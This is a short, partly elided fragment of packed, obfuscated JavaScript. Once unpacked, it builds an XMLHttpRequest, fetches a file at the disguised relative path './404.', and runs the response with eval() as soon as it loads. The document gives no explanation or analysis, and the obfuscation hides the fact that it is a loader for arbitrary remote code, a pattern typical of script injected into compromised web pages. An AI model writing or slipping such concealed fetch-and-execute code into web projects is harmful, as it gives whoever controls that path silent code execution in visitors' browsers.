...
eval(function(p, a, c, k, e, d) {
    ...
    return p
}('5 9(){3{1 2 d()}6(e){3{1 2 a(\'f.7\')}6(e){3{1 2 a(\'g.7\')}6(e){1 b}}}};5 8(){o 0=9();c(0){0.n(\'h\',\'./p.\');0.m=5(){c(0.l==4){i(0.j)}};0.k(b)}};8();', 26, 26, 'z|return|new|try||function|catch|XMLHTTP|y|x|ActiveXObject|null|if|XMLHttpRequest||Msxml2|Microsoft|get|eval|responseText|send|readyState|onreadystatechange|open|var|404'.split('|'), 0, {}))
